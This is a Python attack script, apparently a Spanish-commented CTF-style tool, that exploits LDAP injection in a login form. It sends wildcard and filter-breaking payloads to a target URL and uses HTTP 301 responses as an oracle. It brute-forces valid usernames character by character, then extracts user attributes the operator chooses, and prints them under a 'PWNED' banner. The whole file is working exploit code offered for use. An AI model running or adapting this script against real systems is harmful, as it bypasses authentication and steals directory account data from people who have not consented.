#!/usr/bin/python3

import sys, signal, time, requests, string, argparse
from pwn import *

 # Códigos de colores ANSI
NEGRO = '\033[30m'
ROJO = '\033[31m'
VERDE = '\033[32m'
AMARILLO = '\033[33m'
AZUL = '\033[34m'
MAGENTA = '\033[35m'
CIAN = '\033[36m'
BLANCO = '\033[37m'

# Estilos
NEGRITA = '\033[1m'
SUBRAYADO = '\033[4m'

# Fondos
FONDO_NEGRO = '\033[40m'
FONDO_ROJO = '\033[41m'
FONDO_VERDE = '\033[42m'
FONDO_AMARILLO = '\033[43m'
FONDO_AZUL = '\033[44m'
FONDO_MAGENTA = '\033[45m'
FONDO_CIAN = '\033[46m'
FONDO_BLANCO = '\033[47m'

# Restablecer color a los valores predeterminados
RESET = '\033[0m'

# Tree to get the users
class UserTreeNode:
    def __init__(self, value):
        self.value = value
        self.children = []

    def addChild(self, child):
        self.children.append(child)

def handler(sig, frame):
    print("\n\n[i] SALIENDO\n")
    sys.exit(1)

signal.signal(signal.SIGINT, handler) 

def getARG():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", dest="url", help="URL with the GET PARAM example (http://example.com/example.php?id=2)")
    opcion = parser.parse_args()
    if not opcion.url:
        parser.error("[-] Specify the url for help use -h")
    return opcion

def getUsersTree(main_url,MAX_DEPTH=20):
    p1 = log.progress("Obtaining users")
    p1.status("Starting")
    p2 = log.progress("Username")
    time.sleep(0.2)
    chars=string.ascii_lowercase+string.digits+"!$%/#()?¡¿-+"
    root=UserTreeNode("") # ROOT of the tree
    stack=[(root,0)] # Use a stack so we can store the data
    while stack:
        current_node, depth = stack.pop()
        if depth < MAX_DEPTH: # Check the maximum binary depth
            for char in chars:
                new_pseudouser=current_node.value+char
                payload = f"user_id={new_pseudouser}*&password=*&login=1&submit=Submit"
                p1.status(payload)
                header = {'Content-Type': 'application/x-www-form-urlencoded'}
                r = requests.post(main_url, data=payload, headers=header, allow_redirects=False)
                if r.status_code == 301:
                    p2.status(new_pseudouser)
                    new_node = UserTreeNode(new_pseudouser) # IF new char found add it to the tree
                    current_node.addChild(new_node)
                    stack.append((new_node, depth + 1))
    return root

def extractUsers(node, users):
    if not node.children:
        users.append(node.value)
    for child in node.children:
        extractUsers(child, users)

def getUsers(main_url):
    user_tree = getUsersTree(main_url)
    users = []
    extractUsers(user_tree,users)
    return users

def editMap(mapita,user,object2look,value):
    if user not in mapita:
        mapita[user] = {}
    mapita[user][object2look] = value

def getInfo(main_url,valid_users,objects2look,dicc):
    p1 = log.progress("Obtaining Information")
    p1.status("Starting")
    p2 = log.progress("Data")
    time.sleep(0.2)
    for user in valid_users:
        for obj in objects2look:
            if obj=="description":
                chars=string.ascii_lowercase+string.digits+"!$%/#()?¡¿-@. "
            else:
                chars=string.ascii_lowercase+string.digits+"!$%/#()?¡¿@."
            flag=True
            data=""
            cont=0
            cont2=0
            while flag:
                cont+=1
                for char in chars:
                    payload = f"user_id={user})({obj}={data+char}*&password=*&login=1&submit=Submit"
                    p1.status(f"{obj} from {user} {payload}")
                    header = {'Content-Type': 'application/x-www-form-urlencoded'}
                    r = requests.post(main_url, data=payload, headers=header, allow_redirects=False)
                    if r.status_code == 301:
                        data+=char
                        p2.status(data)
                        cont2+=1
                        break
                if cont != cont2:
                    flag=False
            editMap(dicc,user,obj,data)

if __name__ == '__main__':
    print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} LDAP INJECTION {RESET}{MAGENTA}-----{RESET}\n")
    option=getARG()
    valid_users=getUsers(option.url)
    print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} OBTAINED USERS {RESET}{MAGENTA}-----{RESET}\n")
    for i in valid_users:
        print(f"{VERDE}[*]{RESET} {BLANCO} {i}{RESET}")
    objects2look=[]
    while True:
        objects2look.append(str(input(f"\n{AZUL}[*]{RESET}{BLANCO} Enter the objects you want to find:{RESET}\n{ROJO}\n\n\t[!]{RESET}{BLANCO} Recommendation: FUZZ to get the objects{RESET}\n\n{AZUL}>{RESET} ").replace("\n","")))
        fwd=str(input(f"\n\t{AMARILLO}[?]{RESET}{BLANCO} Do you want to enter another object?{RESET}\n\n{AZUL}>{RESET} "))
        if fwd.lower() == "no\n":
            break
    mapita={}
    print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} RETRIEVING INFORMATION FROM LDAP {RESET}{MAGENTA}-----{RESET}\n")
    getInfo(option.url,valid_users,objects2look,mapita)
    print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} ALL SELECTED INFORMATION DUMPED {RESET}{MAGENTA}-----{RESET}\n")
    for i in valid_users:
        if i in mapita:
            print(f"{ROJO}\n[!]{RESET}{BLANCO} Information from {i}\n\n{RESET}")
            for j in objects2look:
                if j in mapita[i]:
                    print(f'\t{VERDE}[*] {RESET}{BLANCO}{mapita[i][j]}{RESET}')
    print(f"\n\t{MAGENTA}-----{RESET}{BLANCO} PWNED {RESET}{MAGENTA}-----{RESET}\n")
